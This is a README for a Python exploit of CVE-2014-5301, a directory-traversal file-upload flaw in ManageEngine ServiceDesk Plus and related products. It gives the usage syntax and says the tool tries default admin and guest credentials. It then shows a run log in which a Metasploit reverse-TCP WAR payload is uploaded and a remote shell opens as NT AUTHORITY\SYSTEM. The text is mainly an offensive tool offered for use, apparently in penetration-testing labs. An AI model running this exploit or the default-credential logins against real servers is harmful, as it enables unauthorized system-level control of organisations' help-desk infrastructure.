# CVE 2014-5301 - ManageEngine ServiceDesk Plus authenticated upload remote command execution exploit.

This module exploits a directory traversal vulnerability in ManageEngine
ServiceDesk, AssetExplorer, SupportCenter and IT360 when uploading attachment files. The JSP that accepts the upload
does not handle correctly '../' sequences, which can be abused to write to the file system. Authentication is needed to
exploit this vulnerability, but this module will attempt to login using the default credentials for the administrator
and guest accounts. Alternatively, you can provide a pre-authenticated cookie or a username / password.
For IT360 targets, enter the RPORT of the ServiceDesk instance (usually 8400). All versions of ServiceDesk
prior v9 build 9031 (including MSP but excluding v4), AssetExplorer, SupportCenter and IT360 (including MSP) are vulnerable.
At the time of release of this module, only ServiceDesk v9 has been fixed in build 9031 and above.
This module has been been tested successfully in Windows and Linux on several versions.


## Usage

```sh
⬢  manage_engine_plus  master ⦿ ./manageengine_sdplus_rce.py 

█▀▄▀█   ▄▀  █▀▄▀█    ▄▄▄▄▄   ██▄   █ ▄▄  █       ▄      ▄▄▄▄▄   █▄▄▄▄ ▄█▄    ▄███▄   
█ █ █ ▄▀    █ █ █   █     ▀▄ █  █  █   █ █        █    █     ▀▄ █  ▄▀ █▀ ▀▄  █▀   ▀  
█ ▄ █ █ ▀▄  █ ▄ █ ▄  ▀▀▀▀▄   █   █ █▀▀▀  █     █   █ ▄  ▀▀▀▀▄   █▀▀▌  █   ▀  ██▄▄    
█   █ █   █ █   █  ▀▄▄▄▄▀    █  █  █     ███▄  █   █  ▀▄▄▄▄▀    █  █  █▄  ▄▀ █▄   ▄▀ 
   █   ███     █             ███▀   █        ▀ █▄ ▄█              █   ▀███▀  ▀███▀   
  ▀           ▀                      ▀          ▀▀▀              ▀                   
CVE-2014-5301 - ManageEngine ServiceDesk Plus Authenticated File Upload Rce Exploit
[nighter@nighter.se]
    
Usage: ./manageengine_sdplus_rce.py <URL> <LHOST> <LPORT> <USERNAME> <PASSWORD>
EXAMPLE: ./manageengine_sdplus_rce.py 'http://10.11.1.xxx:8080' 10.11.0.xxx 4444 <USERNAME> <PASSWORD>
```

Run exploit

```sh
⬢  manage_engine_plus  master ⦿ ./manageengine_sdplus_rce.py 'http://10.11.1.xx:8080' 10.11.0.xxx 4444 administrator administrator
[+] LHOST = 10.11.0.xxx
[+] LPORT = 4444
[+] Start listener
/opt/metasploit/vendor/bundle/ruby/2.6.0/gems/activesupport-4.2.11/lib/active_support/core_ext/object/duplicable.rb:111: warning: BigDecimal.new is deprecated; use BigDecimal() method instead.
[-] ***
[-] * WARNING: No database support: No database YAML file
[-] ***
[*] Starting persistent handler(s)...
[+] Upload payload
[+] Build ear payload: /tmp/TwPRjvJq.ear
PAYLOAD => java/shell/reverse_tcp
LHOST => 10.11.0.xxx
LPORT => 4444
[*] Started reverse TCP handler on 10.11.0.xxx:4444 
/opt/metasploit/vendor/bundle/ruby/2.6.0/gems/activesupport-4.2.11/lib/active_support/core_ext/object/duplicable.rb:111: warning: BigDecimal.new is deprecated; use BigDecimal() method instead.
Payload size: 6257 bytes
Final size of war file: 6257 bytes
Saved as: TwPRjvJq.war
[+] Exploit
[*] Sending stage (2952 bytes) to 10.11.1.xxx
[*] Command shell session 1 opened (10.11.0.xxx:4444 -> 10.11.1.xxx:49206) at 2019-02-13 21:38:29 +0100

C:\ManageEngine\ServiceDesk\bin>whoami
whoami
nt authority\system
```